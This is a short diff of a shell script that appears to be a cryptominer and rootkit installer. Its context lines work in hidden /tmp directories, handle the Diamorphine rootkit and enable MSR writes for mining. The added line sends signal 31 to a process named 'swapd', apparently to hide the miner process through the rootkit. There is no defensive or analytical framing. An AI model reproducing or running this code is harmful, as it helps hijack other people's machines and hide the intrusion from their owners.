@@ -373,6 +373,7 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; yum install linux-g
 MSR_FILE=/sys/module/msr/parameters/allow_writes
 modprobe msr allow_writes=on
 
+kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 # echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
 
